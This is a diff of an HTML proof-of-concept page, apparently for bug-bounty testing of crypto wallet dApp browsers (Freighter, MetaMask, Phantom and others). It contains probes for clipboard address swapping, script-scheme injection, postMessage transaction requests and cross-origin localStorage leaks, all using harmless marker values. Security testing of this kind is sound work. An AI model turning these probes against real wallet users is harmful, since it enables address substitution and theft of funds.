@@ -1,65 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Dapp Browser Master Test - 0x403for</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Freighter 1.25.28 - Combined POC - 0x403for</title>
 <style>
 body{background:#000;color:#0f0;font-family:monospace;padding:12px}
-button{width:100%;padding:14px;margin:6px 0;background:#111;color:#0f0;border:1px solid #0f0;text-align:left;font-size:12px}
-pre{background:#111;padding:8px;height:300px;overflow:auto;border:1px solid #333;font-size:10px;white-space:pre-wrap}
-h3{color:#ff0}
+h3{color:#ff0;border-bottom:1px solid #333;padding-bottom:4px}
+button{width:100%;padding:14px;margin:5px 0;background:#111;color:#0f0;border:1px solid #0f0;text-align:left;font-size:11px}
+button.crit{border-color:#f00;color:#ff0}
+pre{background:#111;padding:8px;height:300px;overflow:auto;border:1px solid #333;font-size:10px;white-space:pre-wrap;word-break:break-all}
 </style>
 </head>
 <body>
-<h2>Dapp Browser Master Test - 0x403for</h2>
-<small>Test di Trust / Metamask / Phantom / OKX Discover</small>
+<h2>Freighter 1.25.28 Combined - 0x403for</h2>
 
-<h3>1. Provider & WC Dump</h3>
-<button onclick="dump()">A. Dump window.ethereum / phantom / trust / wc</button>
+<h3>1. [HIGH] Clipboard Write Test</h3>
+<button onclick="testClip()">A. Test clipboard.writeText</button>
+<button onclick="readClip()">B. Read clipboard</button>
 
-<h3>2. postMessage Origin Bypass</h3>
-<button onclick="testPostMessage()">B. Test postMessage * origin</button>
+<h3>2. [CRITICAL] Storage Isolation Test</h3>
+<button class="crit" onclick="setTest()">C. SET test key wc:test-0x403for</button>
+<button class="crit" onclick="listKeys()">D. LIST storage current origin</button>
+<button class="crit" onclick="openAqua()">E. OPEN aqua.network new tab</button>
+<button class="crit" onclick="checkLeak()">F. CHECK if test key exists in this origin</button>
 
-<h3>3. JS & Data Scheme</h3>
-<a href="javascript:alert('JS scheme works - '+location.href)" style="display:block;padding:12px;background:#222;color:#f00;border:1px solid #f00;text-align:center">C. Tap - javascript: scheme</a>
-<a href="data:text/html,<h1>data: scheme works</h1><script>alert(document.domain)</script>" style="display:block;padding:12px;background:#222;color:#f00;border:1px solid #f00;text-align:center;margin-top:6px">D. Tap - data: scheme</a>
-
-<h3>4. Clipboard</h3>
-<button onclick="testClip()">E. Test clipboard write (address swap)</button>
-
-<h3>5. WC Session Fixation</h3>
-<button onclick="testWC()">F. Set WC evil key + open new tab</button>
+<h3>3. Provider Dump</h3>
+<button onclick="dump()">G. DUMP provider</button>
 
 <pre id="log"></pre>
+
 <script>
-function log(t){ document.getElementById('log').innerText += t+'\n'; }
-function dump(){
-  log('--- Provider Dump ---');
-  ['ethereum','phantom','trust','trustwallet','okxwallet','rabby','coinbaseWalletExtension','freighter','stellar'].forEach(k=>{
-    if(window[k]) log(k+' FOUND: keys='+Object.keys(window[k]).join(',').substring(0,300));
-    else log(k+' not found');
-  });
-  log('--- WC Storage ---');
-  for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); if(k.toLowerCase().includes('wc')) log('LS WC: '+k+'='+localStorage.getItem(k).substring(0,100)); }
+const TEST_ADDR = 'TEST_CLIPBOARD_0x403for_POC_123';
+const TEST_KEY = 'wc:test-0x403for';
+const TEST_VAL = 'poc-0x403for-'+Date.now();
+
+function log(t){
+  let el=document.getElementById('log');
+  el.innerText+='['+new Date().toLocaleTimeString()+'] '+t+'\n';
+  el.scrollTop=el.scrollHeight;
 }
-function testPostMessage(){
-  log('Sending postMessage to * with eth_sendTransaction...');
-  window.postMessage({method:'eth_sendTransaction', params:[{to:'0x0000000000000000000000000000000000000000'}]}, '*');
-  log('If wallet popup appears without checking origin = CRITICAL');
+
+async function testClip(){
+  log('Testing clipboard.writeText...');
+  try{
+    await navigator.clipboard.writeText(TEST_ADDR);
+    log('SUCCESS - clipboard.writeText allowed: '+TEST_ADDR);
+    log('If no prompt shown = HIGH (should require user gesture/prompt)');
+  }catch(e){ log('Blocked SECURE: '+e.message); }
 }
-function testClip(){
-  log('Trying clipboard write...');
-  navigator.clipboard.writeText('0xEVIL_ADDRESS_0x403for').then(()=>log('Clipboard overwritten - if no user gesture prompt = HIGH')).catch(e=>log('Clipboard blocked: '+e.message+' = SECURE'));
+async function readClip(){
+  try{
+    let v=await navigator.clipboard.readText();
+    log('Clipboard contains: '+v);
+  }catch(e){ log('Read blocked: '+e.message); }
 }
-function testWC(){
-  const evilKey = 'wc:evil-session-0x403for';
-  localStorage.setItem(evilKey, JSON.stringify({test:true}));
-  log('Set '+evilKey+' - now open aqua.network in new tab inside same dApp browser');
-  log('If aqua.network can read '+evilKey+' = WC Fixation CRITICAL');
+
+function setTest(){
+  localStorage.setItem(TEST_KEY, TEST_VAL);
+  log('SET '+TEST_KEY+' = '+TEST_VAL+' in origin '+location.origin);
+}
+function listKeys(){
+  log('--- Storage in '+location.origin+' ---');
+  for(let i=0;i<localStorage.length;i++){
+    let k=localStorage.key(i);
+    if(k.includes('wc')||k.includes('0x403for')) log('LS '+k+'='+localStorage.getItem(k).substring(0,150));
+  }
+}
+function openAqua(){
+  log('Opening aqua.network...');
   window.open('https://aqua.network','_blank');
 }
-log('Ready - Test this file in Trust Wallet, MetaMask Mobile, Phantom, OKX');
-log('Freighter 1.25.28 is secure (provider,platform,version only) - use other wallets');
+function checkLeak(){
+  let v=localStorage.getItem(TEST_KEY);
+  log('Check '+TEST_KEY+' in '+location.origin);
+  if(v) log('LEAK CONFIRMED CRITICAL: key from other origin readable: '+v);
+  else log('NOT FOUND - isolated SECURE');
+  listKeys();
+}
+
+function dump(){
+  log('stellar: '+(window.stellar?Object.keys(window.stellar).join(','):'not found'));
+}
+log('Ready - Same flow as your video 00:00-00:32');
 </script>
 </body>
 </html>
